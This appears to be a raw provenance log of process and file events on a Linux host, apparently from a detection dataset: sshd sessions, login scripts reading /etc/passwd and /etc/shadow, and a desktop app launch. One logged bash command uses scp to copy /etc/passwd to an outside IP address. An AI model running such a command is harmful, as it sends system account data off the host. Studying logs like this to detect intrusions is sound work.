1557868850.208:1462164161,4CFA5269-5422-ABFD-CCA1-467E0ED075CF:exo-helper-1,EXECUTE,943130B8-62BB-66BA-F60E-6A0ED99318C3,x-terminal-emul,null
1557868850.208:1462164150,1064E46B-B9A9-CDE5-9308-9F46B3E68972:exo-helper-1,FORK,4CFA5269-5422-ABFD-CCA1-467E0ED075CF,exo-helper-1,null
1557868850.200:1462163223,7A88C0FC-149F-6810-3D5C-7D6B64EFF933:exo-open,EXECUTE,1064E46B-B9A9-CDE5-9308-9F46B3E68972,exo-helper-1,null
1557868850.200:1462163170,E93FC27A-C294-74B9-200E-77DB45E2F55B:exo-open,FORK,7A88C0FC-149F-6810-3D5C-7D6B64EFF933,exo-open,null
1557868850.200:1462163147,15E6465F-2C78-FA34-32CD-724E1B73D66A:exo-open,FORK,E93FC27A-C294-74B9-200E-77DB45E2F55B,exo-open,null
1557868850.188:1462162081,B91692D3-8235-74A9-6E0F-9DC007C0695F:xfce4-appfinder,EXECUTE,15E6465F-2C78-FA34-32CD-724E1B73D66A,exo-open,null
1557868850.188:1462162060,2A4F22A3-5332-F4F3-C79F-E9F1A2A144E5:xfce4-appfinder,FORK,B91692D3-8235-74A9-6E0F-9DC007C0695F,xfce4-appfinder,null
1557868759.384:1462118352,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868759.384:1462118244,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868759.380:1462118180,0993E3D7-D8FF-6A90-BFD7-C4EB4B83499A:sshd,CHANGE_PRINCIPAL,44499A2A-EE07-32FC-505B-8956BBB3131E,sshd,null
1557868759.380:1462118179,0993E3D7-D8FF-6A90-BFD7-C4EB4B83499A:sshd,CHANGE_PRINCIPAL,0993E3D7-D8FF-6A90-BFD7-C4EB4B83499A,sshd,null
1557868759.380:1462118178,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,CHANGE_PRINCIPAL,0993E3D7-D8FF-6A90-BFD7-C4EB4B83499A,sshd,null
1557868754.096:1462111665,3FF06200-73C7-E20E-E638-DF1AF8BA75A3:bash,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868754.096:1462111579,BF57BDF8-107B-1CCF-3295-461386586013:sshd,EXECUTE,3FF06200-73C7-E20E-E638-DF1AF8BA75A3,bash,null
1557868754.092:1462111460,12040234-27A3-D28D-0656-471D2D82C7A7:sshd,FORK,BF57BDF8-107B-1CCF-3295-461386586013,sshd,null
1557868754.092:1462111413,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868754.092:1462111407,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868754.092:1462111387,1A68FAFA-6DBA-2CE4-CF12-6B6A3BC8AAA3:sshd,CHANGE_PRINCIPAL,12040234-27A3-D28D-0656-471D2D82C7A7,sshd,null
1557868754.092:1462111365,67A90526-08B7-54FB-C69F-EA037CBDA790:sshd,CHANGE_PRINCIPAL,1A68FAFA-6DBA-2CE4-CF12-6B6A3BC8AAA3,sshd,null
1557868754.092:1462111362,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,FORK,67A90526-08B7-54FB-C69F-EA037CBDA790,sshd,null
1557868754.092:1462111353,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868754.092:1462111317,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868754.092:1462111314,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868754.092:1462111311,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868754.048:1462109243,389E586C-FF67-FFEB-CE41-6D285744A3C3:lsb_release,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868754.036:1462109001,58745E85-BDF5-7C9A-E04B-7CC3B1FAD6AF:91-release-upgr,EXECUTE,389E586C-FF67-FFEB-CE41-6D285744A3C3,lsb_release,null
1557868754.036:1462108994,B3D46ADA-CDB2-6E93-04AD-7A80C33E35C8:91-release-upgr,FORK,58745E85-BDF5-7C9A-E04B-7CC3B1FAD6AF,91-release-upgr,null
1557868754.036:1462108987,622D26F9-E128-3343-C8C4-4F718DC55D07:91-release-upgr,FORK,B3D46ADA-CDB2-6E93-04AD-7A80C33E35C8,91-release-upgr,null
1557868754.036:1462108965,663F6CEC-4811-D00E-9B09-118BD873E468:run-parts,EXECUTE,622D26F9-E128-3343-C8C4-4F718DC55D07,91-release-upgr,null
1557868754.036:1462108964,EB6D7B90-1835-E06B-5346-70C226E6929F:run-parts,FORK,663F6CEC-4811-D00E-9B09-118BD873E468,run-parts,null
1557868753.892:1462100901,E2B15256-14FD-F4C7-7A09-3BB8E34FBE12:landscape-sysin,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868753.884:1462100478,6F11E419-E479-6604-EEC9-631A3EA95482:50-landscape-sy,EXECUTE,E2B15256-14FD-F4C7-7A09-3BB8E34FBE12,landscape-sysin,null
1557868753.884:1462100468,DA220C71-9769-4716-B71C-BBB4D720975F:50-landscape-sy,FORK,6F11E419-E479-6604-EEC9-631A3EA95482,50-landscape-sy,null
1557868753.880:1462100192,39246EC2-F3A4-9831-55C9-53726EB9E672:run-parts,EXECUTE,DA220C71-9769-4716-B71C-BBB4D720975F,50-landscape-sy,null
1557868753.880:1462100186,EB6D7B90-1835-E06B-5346-70C226E6929F:run-parts,FORK,39246EC2-F3A4-9831-55C9-53726EB9E672,run-parts,null
1557868753.876:1462099855,E7D99D16-6525-0BDD-5ED8-54E1CAE22DC3:env,EXECUTE,EB6D7B90-1835-E06B-5346-70C226E6929F,run-parts,null
1557868753.876:1462099805,639798A7-672F-A91E-E5A8-864771551484:sh,EXECUTE,E7D99D16-6525-0BDD-5ED8-54E1CAE22DC3,env,null
1557868753.876:1462099800,836C275C-BE2A-5864-96CA-81A12D490C30:sh,FORK,639798A7-672F-A91E-E5A8-864771551484,sh,null
1557868753.876:1462099761,00B18E57-C049-A3A4-15BF-0E946296687D:sshd,EXECUTE,836C275C-BE2A-5864-96CA-81A12D490C30,sh,null
1557868753.876:1462099743,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,FORK,00B18E57-C049-A3A4-15BF-0E946296687D,sshd,null
1557868753.876:1462099729,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868753.860:1462099395,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868753.860:1462099344,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868753.860:1462099332,ACBD5F8A-39BF-FBD9-C37B-7C25009A1CC3:sshd,CHANGE_PRINCIPAL,44499A2A-EE07-32FC-505B-8956BBB3131E,sshd,null
1557868753.860:1462099331,FD8B8A69-9EAE-AB82-AF06-62E34965D199:sshd,CHANGE_PRINCIPAL,ACBD5F8A-39BF-FBD9-C37B-7C25009A1CC3,sshd,null
1557868753.860:1462099330,ACBD5F8A-39BF-FBD9-C37B-7C25009A1CC3:sshd,CHANGE_PRINCIPAL,FD8B8A69-9EAE-AB82-AF06-62E34965D199,sshd,null
1557868753.860:1462099329,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,CHANGE_PRINCIPAL,ACBD5F8A-39BF-FBD9-C37B-7C25009A1CC3,sshd,null
1557868753.860:1462099327,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868753.860:1462099313,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868753.860:1462099273,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557868753.860:1462099270,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868753.852:1462099245,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557868753.852:1462099242,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868753.748:1462099019,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868753.748:1462098987,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557868753.748:1462098986,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557868753.644:1462098068,44499A2A-EE07-32FC-505B-8956BBB3131E:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868753.640:1462097811,4B09CFA7-8C12-7584-9ABF-15479B55787E:sshd,EXECUTE,44499A2A-EE07-32FC-505B-8956BBB3131E,sshd,null
1557868753.640:1462097790,3E8119A1-F9B4-0931-53D3-3FF11EEA5228:sshd,FORK,4B09CFA7-8C12-7584-9ABF-15479B55787E,sshd,null
1557868752.480:1462095186,2904B97A-7143-E01C-B269-0D07C1813DD7:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868752.480:1462095157,2904B97A-7143-E01C-B269-0D07C1813DD7:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868752.480:1462095039,964C62D4-F319-EDAD-A5A4-F3E7B30F9BCF:sshd,CHANGE_PRINCIPAL,2904B97A-7143-E01C-B269-0D07C1813DD7,sshd,null
1557868752.480:1462095038,964C62D4-F319-EDAD-A5A4-F3E7B30F9BCF:sshd,CHANGE_PRINCIPAL,964C62D4-F319-EDAD-A5A4-F3E7B30F9BCF,sshd,null
1557868752.480:1462095037,2904B97A-7143-E01C-B269-0D07C1813DD7:sshd,CHANGE_PRINCIPAL,964C62D4-F319-EDAD-A5A4-F3E7B30F9BCF,sshd,null
1557868751.364:1462092553,2B82DA07-9495-B7B3-C146-205517179A91:scp,READ,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868750.400:1462091491,FA835335-279E-4004-583B-541DD24B39FF:ssh,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868750.400:1462091488,FA835335-279E-4004-583B-541DD24B39FF:ssh,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868750.400:1462091485,FA835335-279E-4004-583B-541DD24B39FF:ssh,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868750.400:1462091482,FA835335-279E-4004-583B-541DD24B39FF:ssh,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868750.400:1462091479,FA835335-279E-4004-583B-541DD24B39FF:ssh,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868750.400:1462091476,FA835335-279E-4004-583B-541DD24B39FF:ssh,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868750.400:1462091473,FA835335-279E-4004-583B-541DD24B39FF:ssh,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868750.396:1462091432,FA835335-279E-4004-583B-541DD24B39FF:ssh,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868750.396:1462091337,EDC88032-77E9-4F26-3D11-0EAB06FD652A:scp,EXECUTE,FA835335-279E-4004-583B-541DD24B39FF,ssh,null
1557868750.396:1462091328,2B82DA07-9495-B7B3-C146-205517179A91:scp,FORK,EDC88032-77E9-4F26-3D11-0EAB06FD652A,scp,null
1557868750.396:1462091321,2B82DA07-9495-B7B3-C146-205517179A91:scp,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868750.396:1462091260,2D860509-EDC3-C30F-46D4-C5B0884ABE89:bash,EXECUTE,2B82DA07-9495-B7B3-C146-205517179A91,b'scp -r /etc/passwd admin@128.55.12.66:\\C:WindowsTemp',null
1557868750.396:1462091254,2C9C8970-565D-E274-9D50-2F0A9B612AD2:bash,FORK,2D860509-EDC3-C30F-46D4-C5B0884ABE89,bash,null
1557868750.212:1462088045,2C9C8970-565D-E274-9D50-2F0A9B612AD2:bash,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868750.212:1462087959,C5B87E77-F9C1-74AD-A799-6B67F5032BDF:sshd,EXECUTE,2C9C8970-565D-E274-9D50-2F0A9B612AD2,bash,null
1557868750.208:1462087841,2A8C9B82-9BF7-0155-B02B-300D64331CED:sshd,FORK,C5B87E77-F9C1-74AD-A799-6B67F5032BDF,sshd,null
1557868750.208:1462087793,2904B97A-7143-E01C-B269-0D07C1813DD7:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868750.208:1462087787,2904B97A-7143-E01C-B269-0D07C1813DD7:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868750.208:1462087768,37A9236E-BF28-A0CB-37B3-AF82E23E44CD:sshd,CHANGE_PRINCIPAL,2A8C9B82-9BF7-0155-B02B-300D64331CED,sshd,null
1557868750.208:1462087746,B3B2AA42-EBEC-B094-B27E-28A2AE5D6BC7:sshd,CHANGE_PRINCIPAL,37A9236E-BF28-A0CB-37B3-AF82E23E44CD,sshd,null
1557868750.208:1462087743,2904B97A-7143-E01C-B269-0D07C1813DD7:sshd,FORK,B3B2AA42-EBEC-B094-B27E-28A2AE5D6BC7,sshd,null
1557868750.208:1462087734,2904B97A-7143-E01C-B269-0D07C1813DD7:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868750.208:1462087698,2904B97A-7143-E01C-B269-0D07C1813DD7:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868750.208:1462087695,2904B97A-7143-E01C-B269-0D07C1813DD7:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868750.208:1462087692,2904B97A-7143-E01C-B269-0D07C1813DD7:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868750.152:1462085510,673756DA-239E-6477-2093-380D65293D98:lsb_release,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868750.140:1462085268,B18F9579-0F3D-8FD8-7FC4-E1AB060C810B:91-release-upgr,EXECUTE,673756DA-239E-6477-2093-380D65293D98,lsb_release,null
1557868750.140:1462085243,680695C7-9170-1A95-296F-E25062C905E7:91-release-upgr,FORK,B18F9579-0F3D-8FD8-7FC4-E1AB060C810B,91-release-upgr,null
1557868750.140:1462085236,4E453EA9-81BA-45B4-8672-01C626993D51:91-release-upgr,FORK,680695C7-9170-1A95-296F-E25062C905E7,91-release-upgr,null
1557868750.140:1462085214,4A1FCA4B-BF94-9D69-760A-5F500ED572AD:run-parts,EXECUTE,4E453EA9-81BA-45B4-8672-01C626993D51,91-release-upgr,null
1557868750.140:1462085213,A99E3161-D570-BECA-3E69-6E50CE3F89DD:run-parts,FORK,4A1FCA4B-BF94-9D69-760A-5F500ED572AD,run-parts,null
1557868749.984:1462076809,F85695F2-39A7-AAB2-6C29-8550BFD7D794:landscape-sysin,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868749.976:1462076387,74717FF6-2AC8-0E38-ADF5-9968B692CA89:50-landscape-sy,EXECUTE,F85695F2-39A7-AAB2-6C29-8550BFD7D794,landscape-sysin,null
1557868749.976:1462076385,7B0FF9DF-4F2B-641B-E5C3-0F40E8F336E1:50-landscape-sy,FORK,74717FF6-2AC8-0E38-ADF5-9968B692CA89,50-landscape-sy,null
1557868749.972:1462076155,5A90DAC6-7C0A-D6E1-8D96-108C4C15F9FA:run-parts,EXECUTE,7B0FF9DF-4F2B-641B-E5C3-0F40E8F336E1,50-landscape-sy,null
1557868749.972:1462076154,A99E3161-D570-BECA-3E69-6E50CE3F89DD:run-parts,FORK,5A90DAC6-7C0A-D6E1-8D96-108C4C15F9FA,run-parts,null
1557868749.968:1462075826,BA74335C-9DA2-F7FD-55C1-2D3A3554F628:env,EXECUTE,A99E3161-D570-BECA-3E69-6E50CE3F89DD,run-parts,null
1557868749.968:1462075797,39AB8BFB-799D-62F3-AA9D-C2A5B9008917:sh,EXECUTE,BA74335C-9DA2-F7FD-55C1-2D3A3554F628,env,null
1557868749.964:1462075719,62E5D475-E185-6594-D31A-24EBE87EC4F8:sh,FORK,39AB8BFB-799D-62F3-AA9D-C2A5B9008917,sh,null
1557868749.964:1462075678,82CE6F71-4194-DCF0-2A27-B7AB7E0B074E:sshd,EXECUTE,62E5D475-E185-6594-D31A-24EBE87EC4F8,sh,null
1557868749.964:1462075668,2904B97A-7143-E01C-B269-0D07C1813DD7:sshd,FORK,82CE6F71-4194-DCF0-2A27-B7AB7E0B074E,sshd,null
1557868749.964:1462075665,2904B97A-7143-E01C-B269-0D07C1813DD7:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868749.944:1462075283,2904B97A-7143-E01C-B269-0D07C1813DD7:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868749.944:1462075232,2904B97A-7143-E01C-B269-0D07C1813DD7:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868749.944:1462075220,A9865D26-4421-024F-BA7F-96BA3829EE17:sshd,CHANGE_PRINCIPAL,2904B97A-7143-E01C-B269-0D07C1813DD7,sshd,null
1557868749.944:1462075219,709430B4-53DE-9079-018E-68A705B0A37A:sshd,CHANGE_PRINCIPAL,A9865D26-4421-024F-BA7F-96BA3829EE17,sshd,null
1557868749.944:1462075218,A9865D26-4421-024F-BA7F-96BA3829EE17:sshd,CHANGE_PRINCIPAL,709430B4-53DE-9079-018E-68A705B0A37A,sshd,null
1557868749.944:1462075217,2904B97A-7143-E01C-B269-0D07C1813DD7:sshd,CHANGE_PRINCIPAL,A9865D26-4421-024F-BA7F-96BA3829EE17,sshd,null
1557868749.944:1462075215,2904B97A-7143-E01C-B269-0D07C1813DD7:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868749.944:1462075201,2904B97A-7143-E01C-B269-0D07C1813DD7:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
1557868749.944:1462075161,2904B97A-7143-E01C-B269-0D07C1813DD7:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557868749.944:1462075158,2904B97A-7143-E01C-B269-0D07C1813DD7:sshd,MMAP,C2AF90E4-E50C-A152-D509-2A259801BF46,/etc/passwd,null
